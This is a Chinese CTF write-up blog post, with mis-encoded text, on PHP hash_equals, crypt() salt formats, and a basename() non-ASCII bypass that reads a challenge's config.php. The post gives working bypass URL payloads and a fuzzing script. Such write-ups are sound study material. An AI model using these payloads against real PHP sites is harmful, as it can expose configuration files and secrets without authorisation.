<h2 id="ä¸»è¦è¯´ä¸€ä¸‹å‡ ä¸ªå…³é”®ç‚¹"><a href="#ä¸»è¦è¯´ä¸€ä¸‹å‡ ä¸ªå…³é”®ç‚¹" class="headerlink" title="ä¸»è¦è¯´ä¸€ä¸‹å‡ ä¸ªå…³é”®ç‚¹"></a>ä¸»è¦è¯´ä¸€ä¸‹å‡ ä¸ªå…³é”®ç‚¹</h2><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.hash-equals.php">hash_equals å‡½æ•°</a><br><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.crypt.php">crypt åŠ å¯†å‡½æ•°</a></p>
<p>åœ¨å¯†ç å­¦ä¸­ï¼Œæ—¶åºæ”»å‡»æ˜¯ä¸€ç§ä¾§ä¿¡é“æ”»å‡»ï¼Œæ”»å‡»è€…è¯•å›¾é€šè¿‡åˆ†æåŠ å¯†ç®—æ³•çš„æ—¶é—´æ‰§è¡Œæ¥æ¨å¯¼å‡ºå¯†ç ã€‚æ¯ä¸€ä¸ªé€»è¾‘è¿ç®—åœ¨è®¡ç®—æœºéœ€è¦æ—¶é—´æ¥æ‰§è¡Œï¼Œæ ¹æ®è¾“å…¥ä¸åŒï¼Œç²¾ç¡®æµ‹é‡æ‰§è¡Œæ—¶é—´ï¼Œæ ¹æ®æ‰§è¡Œæ—¶é—´åæ¨å‡ºå¯†ç ã€‚</p>
<p>å¦‚æœæ˜¯ç”¨æ™®é€šçš„ <code>==</code> æ¥è¿›è¡Œæ¯”è¾ƒï¼Œé‚£ä¹ˆä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯ä»ç¬¬ä¸€ä½å¼€å§‹é€ä¸€è¿›è¡Œæ¯”è¾ƒçš„ï¼Œå‘ç°ä¸åŒå°±ç«‹å³è¿”å› <code>false</code>ï¼Œé‚£ä¹ˆé€šè¿‡è®¡ç®—è¿”å›çš„é€Ÿåº¦å°±çŸ¥é“äº†å¤§æ¦‚æ˜¯å“ªä¸€ä½å¼€å§‹ä¸åŒçš„ï¼Œ<code>php</code> ä¸­ä¸ºäº†åº”å¯¹è¿™ç§æƒ…å†µï¼Œå°±ä½¿ç”¨ <code>hash_equalså‡½æ•°</code>ã€‚</p>
<p>ç¤ºä¾‹å¦‚ä¸‹</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>  = <span class="title function_ invoke__">crypt</span>(<span class="string">&#x27;114514&#x27;</span>, <span class="string">&#x27;$2a$07$stringforsalt$&#x27;</span>);</span><br><span class="line"><span class="variable">$AAA</span>   = <span class="title function_ invoke__">crypt</span>(<span class="string">&#x27;114514&#x27;</span>, <span class="string">&#x27;$2a$07$stringforsalt$&#x27;</span>);</span><br><span class="line"><span class="variable">$BBB</span> = <span class="title function_ invoke__">crypt</span>(<span class="string">&#x27;manako&#x27;</span>, <span class="string">&#x27;$2a$07$stringforsalt$&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">hash_equals</span>(<span class="variable">$test</span>, <span class="variable">$AAA</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">hash_equals</span>(<span class="variable">$test</span>, <span class="variable">$BBB</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>å›æ˜¾</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span>(<span class="literal">true</span>)</span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">true</span>)</span><br></pre></td></tr></table></figure></div>

<p>è€Œå°†ç›å€¼ä¿®æ”¹ä¸ºè¦æ±‚çš„æ•£åˆ—ç±» <code>$2a$07$usesomesillystringforsalt$</code><br>æˆ–è€…å»æ‰boolå˜é‡å®šä¹‰ï¼Œç›´æ¥å°†ç›å€¼å˜æˆ <code>stringforsalt</code> è¿”å›ä¼šåˆ¤å®šä¸º <code>false</code></p>
<p>åŒæ—¶çœ‹åˆ°ä¸€å¥è¿™æ ·çš„è¯:</p>
<blockquote>
<p>When the failure string â€œ*0â€ is given as the salt, â€œ*1â€ will now be returned for consistency with other crypt implementations. Prior to this version, PHP 5.6 would incorrectly return a DES hash.</p>
</blockquote>
<p>é¦–å…ˆæ¥çœ‹ä¸€ä¸‹è¿™ä¸ªåŠ å¯†ç®—æ³•<br><code>crypt</code> æœ‰ä¸¤ä¸ªå‚æ•°ï¼š<br>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šåŠ å¯†å­—ç¬¦ä¸²<br>ç¬¬äºŒä¸ªå‚æ•°ï¼šç›å€¼å­—ç¬¦ä¸² <code>/$str = &#39;123456789&#39;</code>;<br>ä½¿ç”¨è‡ªåŠ¨ç›å€¼ <code>echo&#39;è‡ªåŠ¨ ç›å€¼: &#39; . crypt($str) . &quot;\n&quot;; </code><br>å¦‚ <code>$1$yvnZHBo0$sBZBd0vzZYnxbtQftQulZ</code></p>
<hr>
<h2 id="ä»¥ä¸åŒæ•£åˆ—ç±»å‹ä½¿ç”¨-crypt"><a href="#ä»¥ä¸åŒæ•£åˆ—ç±»å‹ä½¿ç”¨-crypt" class="headerlink" title="ä»¥ä¸åŒæ•£åˆ—ç±»å‹ä½¿ç”¨ crypt()"></a>ä»¥ä¸åŒæ•£åˆ—ç±»å‹ä½¿ç”¨ crypt()</h2><h3 id="CRYPT-STD-DES-åŸºäºæ ‡å‡†-DES-ç®—æ³•çš„æ•£åˆ—ä½¿ç”¨"><a href="#CRYPT-STD-DES-åŸºäºæ ‡å‡†-DES-ç®—æ³•çš„æ•£åˆ—ä½¿ç”¨" class="headerlink" title="CRYPT_STD_DES - åŸºäºæ ‡å‡† DES ç®—æ³•çš„æ•£åˆ—ä½¿ç”¨"></a>CRYPT_STD_DES - åŸºäºæ ‡å‡† DES ç®—æ³•çš„æ•£åˆ—ä½¿ç”¨</h3><p><code>./0-9A-Za-z</code> å­—ç¬¦ä¸­çš„ä¸¤ä¸ªå­—ç¬¦ä½œä¸ºç›å€¼ã€‚<br>åœ¨ç›å€¼ä¸­ä½¿ç”¨éæ³•çš„å­—ç¬¦å°†å¯¼è‡´ <code>crypt()</code> å¤±è´¥ã€‚</p>
<h3 id="CRYPT-EXT-DES-æ‰©å±•çš„åŸºäº-DES-ç®—æ³•çš„æ•£åˆ—ã€‚"><a href="#CRYPT-EXT-DES-æ‰©å±•çš„åŸºäº-DES-ç®—æ³•çš„æ•£åˆ—ã€‚" class="headerlink" title="CRYPT_EXT_DES - æ‰©å±•çš„åŸºäº DES ç®—æ³•çš„æ•£åˆ—ã€‚"></a>CRYPT_EXT_DES - æ‰©å±•çš„åŸºäº DES ç®—æ³•çš„æ•£åˆ—ã€‚</h3><p>å…¶ç›å€¼ä¸º <code>9</code> ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œç”± <code>1</code> ä¸ªä¸‹åˆ’çº¿åé¢è·Ÿç€ <code>4</code> å­—èŠ‚å¾ªç¯æ¬¡æ•°å’Œ <code>4</code> å­—èŠ‚ç›å€¼ç»„æˆã€‚<br>å®ƒä»¬è¢«ç¼–ç æˆå¯æ‰“å°å­—ç¬¦ï¼Œæ¯ä¸ªå­—ç¬¦ <code>6</code> ä½ï¼Œæœ‰æ•ˆä½æœ€å°‘çš„ä¼˜å…ˆã€‚<br><code>0</code> åˆ° <code>63</code> è¢«ç¼–ç ä¸º <code>./0-9A-Za-z</code>ã€‚</p>
<h3 id="CRYPT-MD5-MD5-æ•£åˆ—"><a href="#CRYPT-MD5-MD5-æ•£åˆ—" class="headerlink" title="CRYPT_MD5 - MD5 æ•£åˆ—"></a>CRYPT_MD5 - MD5 æ•£åˆ—</h3><p>ä½¿ç”¨ä¸€ä¸ªä»¥ <code>$1$</code> å¼€å§‹çš„ <code>12</code> å­—ç¬¦çš„å­—ç¬¦ä¸²ç›å€¼ã€‚</p>
<h3 id="CRYPT-BLOWFISH-Blowfish-ç®—æ³•"><a href="#CRYPT-BLOWFISH-Blowfish-ç®—æ³•" class="headerlink" title="CRYPT_BLOWFISH - Blowfish ç®—æ³•"></a>CRYPT_BLOWFISH - Blowfish ç®—æ³•</h3><p>ä½¿ç”¨å¦‚ä¸‹ç›å€¼ï¼š<code>$2a$</code>ï¼Œä¸€ä¸ªä¸¤ä½ <code>cost</code> å‚æ•°ï¼Œ<code>$</code> ä»¥åŠ <code>64</code> ä½ç”± <code>./0-9A-Za-z</code> ä¸­çš„å­—ç¬¦ç»„åˆè€Œæˆçš„å­—ç¬¦ä¸²ã€‚<br>åœ¨ç›å€¼ä¸­ä½¿ç”¨æ­¤èŒƒå›´ä¹‹å¤–çš„å­—ç¬¦å°†å¯¼è‡´ <code>crypt()</code> è¿”å›ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ã€‚<br>ä¸¤ä½ <code>cost</code> å‚æ•°æ˜¯å¾ªç¯æ¬¡æ•°ä»¥ <code>2</code> ä¸ºåº•çš„å¯¹æ•°ï¼Œå®ƒçš„èŒƒå›´æ˜¯ <code>04-31</code>ï¼Œè¶…å‡ºè¿™ä¸ªèŒƒå›´å°†å¯¼è‡´ <code>crypt()</code> å¤±è´¥ã€‚</p>
<p><font color="red">ï¼ï¼ï¼éœ€è¦æ³¨æ„åˆ°ä¸€ç‚¹</font>ï¼Œç›å€¼è¦æ±‚ä¸º <code>64ä½</code>ï¼Œé•¿åº¦ä¸æ»¡è¶³å°±ä¼šåŠ å¯†å¤±è´¥ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆä¸Šé¢çš„ç¤ºä¾‹ä½¿ç”¨<code>$2a$07$stringforsalt$</code> ä¼šå‡ºç° <code>hash</code> éªŒè¯ä¸º <code>true</code>;</p>
<h3 id="CRYPT-SHA256-x2F-SHA512-æ•£åˆ—ç®—æ³•"><a href="#CRYPT-SHA256-x2F-SHA512-æ•£åˆ—ç®—æ³•" class="headerlink" title="CRYPT_SHA256&#x2F;SHA512 æ•£åˆ—ç®—æ³•"></a>CRYPT_SHA256&#x2F;SHA512 æ•£åˆ—ç®—æ³•</h3><p><code>SHA-256</code> ç®—æ³•ä½¿ç”¨ä¸€ä¸ªä»¥ <code>$5$</code> å¼€å¤´çš„ <code>16</code> å­—ç¬¦å­—ç¬¦ä¸²ç›å€¼è¿›è¡Œæ•£åˆ—<br>å¦‚æœç›å€¼å­—ç¬¦ä¸²ä»¥ <code>rounds=$</code> å¼€å¤´ï¼Œ<code>N</code> çš„æ•°å­—å€¼å°†è¢«ç”¨æ¥æŒ‡å®šæ•£åˆ—å¾ªç¯çš„æ‰§è¡Œæ¬¡æ•°ï¼Œè¿™ç‚¹å¾ˆåƒ Blowfish ç®—æ³•çš„ <code>cost</code> å‚æ•°ã€‚é»˜è®¤çš„å¾ªç¯æ¬¡æ•°æ˜¯ <code>5000</code>ï¼Œæœ€å°æ˜¯ <code>1000</code>ï¼Œæœ€å¤§æ˜¯ <code>999,999,999</code>ã€‚è¶…å‡ºè¿™ä¸ªèŒƒå›´çš„ <code>N</code> å°†ä¼šè¢«è½¬æ¢ä¸ºæœ€æ¥è¿‘çš„å€¼ã€‚</p>
<p><code>SHA-256</code> å’Œ <code>SHA-512</code> åŒç†</p>
<p>åŠ å¯†ç¤ºä¾‹</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (CRYPT_STD_DES == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Standard DES: &#x27;</span> . <span class="title function_ invoke__">crypt</span>(<span class="string">&#x27;rasmuslerdorf&#x27;</span>, <span class="string">&#x27;rl&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CRYPT_EXT_DES == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Extended DES: &#x27;</span> . <span class="title function_ invoke__">crypt</span>(<span class="string">&#x27;rasmuslerdorf&#x27;</span>, <span class="string">&#x27;_J9..rasm&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CRYPT_MD5 == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;MD5:          &#x27;</span> . <span class="title function_ invoke__">crypt</span>(<span class="string">&#x27;rasmuslerdorf&#x27;</span>, <span class="string">&#x27;$1$rasmusle$&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CRYPT_BLOWFISH == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Blowfish:     &#x27;</span> . <span class="title function_ invoke__">crypt</span>(<span class="string">&#x27;rasmuslerdorf&#x27;</span>, <span class="string">&#x27;$2a$07$usesomesillystringforsalt$&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CRYPT_SHA256 == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;SHA-256:      &#x27;</span> . <span class="title function_ invoke__">crypt</span>(<span class="string">&#x27;rasmuslerdorf&#x27;</span>, <span class="string">&#x27;$5$rounds=5000$usesomesillystringforsalt$&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CRYPT_SHA512 == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;SHA-512:      &#x27;</span> . <span class="title function_ invoke__">crypt</span>(<span class="string">&#x27;rasmuslerdorf&#x27;</span>, <span class="string">&#x27;$6$rounds=5000$usesomesillystringforsalt$&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="å›å½’åˆ°è§£é¢˜æœ¬èº«"><a href="#å›å½’åˆ°è§£é¢˜æœ¬èº«" class="headerlink" title="å›å½’åˆ°è§£é¢˜æœ¬èº«"></a>å›å½’åˆ°è§£é¢˜æœ¬èº«</h2><h3 id="æ€è·¯1"><a href="#æ€è·¯1" class="headerlink" title="æ€è·¯1"></a>æ€è·¯1</h3><p>æ¯”è¾ƒä¸¤ä¸ªæäº¤çš„å‚æ•°æ˜¯å¦ç›¸ç­‰ï¼Œåˆ™ç»™å‡ºflagï¼Œ<code>random_bytes</code>å‡½æ•°ç”Ÿæˆé€‚åˆäºåŠ å¯†ä½¿ç”¨çš„ä»»æ„é•¿åº¦çš„åŠ å¯†éšæœºå­—èŠ‚å­—ç¬¦ä¸²ï¼Œéšåé€šè¿‡<code>bin2hex</code>è½¬æ¢ä¸ºåå…­è¿›åˆ¶å€¼</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">random_bytes</span>(<span class="number">64</span>)) .<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//éœ€è¦å°†PHP version æ›´æ”¹ä¸º&gt;=7</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">64</span>)) .<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">random_bytes</span>(<span class="number">64</span>)) .<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">64</span>)) .<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="æ€è·¯2"><a href="#æ€è·¯2" class="headerlink" title="æ€è·¯2"></a>æ€è·¯2</h3><p>ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼è®¿é—®å¼€å¤´æºç æç¤ºflagçš„config.php</p>
<p>éœ€è¦äº†è§£çš„å‡ ä¸ªä¸œè¥¿ <a target="_blank" rel="noopener" href="https://www.php.net/basename">basenameå‡½æ•°</a> ä»¥åŠ <a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=62119">å‡½æ•°æ¼æ´</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42314192/article/details/116257437">å‚è€ƒæ€è·¯ï¼ŒPHPé‡Œçš„basenameå‡½æ•°ä¸æ”¯æŒä¸­æ–‡åçš„è§£å†³</a></p>
<p>é¦–å…ˆå…ˆçœ‹å…¨å±€å˜é‡ <code>$_SERVER[â€˜PHP_SELFâ€™]</code> </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[â€˜PHP_SELFâ€™] è·å–å½“å‰é¡µé¢åœ°å€</span><br><span class="line">æ˜¯å½“å‰ php æ–‡ä»¶ç›¸å¯¹äºç½‘ç«™æ ¹ç›®å½•çš„ä½ç½®åœ°å€</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//www.test.com/php/ | /php/index.php</span></span><br><span class="line">http:<span class="comment">//www.test.com/php/index.php | /php/index.php</span></span><br><span class="line">http:<span class="comment">//www.test.com/php/index.php?test=yakko | /php/index.php</span></span><br><span class="line">http:<span class="comment">//www.test.com/php/index.php/test/yakko | /php/index.php/test/yakko</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_SERVER</span>[â€˜REQUEST_URIâ€™]å®Œæ•´urlåœ°å€ï¼ŒåŒ…æ‹¬è¯·æ±‚çš„urlå‚æ•°</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SERVER</span>[â€˜HTTP_HOSTâ€™]åªæœ‰ä¸€æ®µçš„åŸŸå,ä¸åŒ…æ‹¬å‰é¢çš„åè®®å’Œåé¢çš„ç›¸å¯¹ä½ç½®</span><br></pre></td></tr></table></figure></div>

<p>è®¿é—® <code>/index.php/config.php</code>ï¼Œç»è¿‡ <code>basename()</code> ä¼ å…¥ <code>highlight_file()</code> çš„æ–‡ä»¶åå°±ä¼šå˜æˆ <code>config.php</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$url1</span> = <span class="string">&quot;testpath/index.php&quot;</span>;</span><br><span class="line">     <span class="comment">// è¿”å›index.php</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$url2</span> = <span class="string">&quot;testpath/index.php&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%D1%A7%CF&#x27;</span>); </span><br><span class="line">    <span class="comment">// è¿”å›index.phpå’Œä¹±ç </span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$url3</span> = <span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%D1%A7%CF%B0index.php+ &#x27;</span>);</span><br><span class="line">     <span class="comment">// è¿”å›flagï¼Œå‰é¢çš„éacsiiè¢«åˆ é™¤</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$url4</span> = <span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;index.php%D1%A7%CF%B0 &#x27;</span>); </span><br><span class="line">    <span class="comment">// è¿”å›flagå’Œåé¢çš„éascii</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$url1</span>) .<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$url2</span>) .<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$url3</span>) .<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$url4</span>) .<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>Payload1</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">http</div></div><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/index.php/config.php/ä»»æ„ä¸­æ–‡?source</span><br></pre></td></tr></table></figure></div>

<p>ä»¥åŠå¤§ä½¬çš„fuzzæ€è·¯</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">255</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$str</span>=<span class="string">&quot;/index.php/config.php/&quot;</span>.<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">check</span>(<span class="variable">$str</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$i</span>.<span class="string">&quot;ï¼š&quot;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$str</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>Payload2</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">http</div></div><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/index.php/config.php/%80?source</span><br></pre></td></tr></table></figure></div>

<p>å‚è€ƒå¾ˆå¤šå¤§ä½¬çš„æ€è·¯<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_58784379/article/details/121742710">sGanYu(Zer0pts2020)basenameå‡½æ•°æ¼æ´</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/110929280">bfengj(Zer0pts2020)Can you guess it?çš„WP</a></p>
<hr>
<h1 id="å¨é€¼å‡ å¥"><a href="#å¨é€¼å‡ å¥" class="headerlink" title="å¨é€¼å‡ å¥"></a>å¨é€¼å‡ å¥</h1><p>å¾ˆä¹…æ²¡åšé¢˜äº†ï¼Œæ‘¸äº†å¤ªä¹…äº†ï¼Œçš„ç¡®è‡ªå·±ç”Ÿç–äº†å¾ˆå¤šï¼Œ2021å¹´ç¡®å®å¾ˆå¤šäº‹æƒ…ä¸æ€ä¹ˆé¡ºï¼Œå¸Œæœ›æ–°çš„ä¸€å¹´èƒ½å¥½ä¸€äº›å§</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="mailto:undefined">Manayakko</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="https://manayakko.github.io/yakko117/2022/01/03/buuctfDay09/">https://manayakko.github.io/yakko117/2022/01/03/buuctfDay09/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥è‡ª <a href="https://manayakko.github.io/yakko117">Manayakko - å¾®ç¬‘æ‰æ˜¯ç‹é“</a>ï¼</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/yakko117/tags/writeup/">writeup    </a><a class="post-meta__tags" href="/yakko117/tags/ctf/">ctf    </a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexv5i14j308k08ot9j.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/yakko117/2022/01/04/BUUCTFDay10/"><img class="prev_cover lazyload" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/9a88975fec4255819a88f8d9c73c8948.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="label">ä¸Šä¸€ç¯‡</div><div class="prev_info"><span>BuuctfDay10</span></div></a></div><div class="next-post pull_right"><a href="/yakko117/2020/04/18/NPUCTF2020/"><img class="next_cover lazyload" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexv5i14j308k08ot9j.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="label">ä¸‹ä¸€ç¯‡</div><div class="next_info"><span>Ha1cyonCTF2020-å…¬å¼€èµ›</span></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fa fa-fw fa-thumbs-up" aria-hidden="true"></i><span> ç›¸å…³æ¨è</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/yakko117/2020/01/31/2020æ–°æ˜¥çº¢åŒ…/" title="èµµå¸ˆå‚…çš„æ–°æ˜¥çº¢åŒ…é¢˜"><img class="relatedPosts_cover 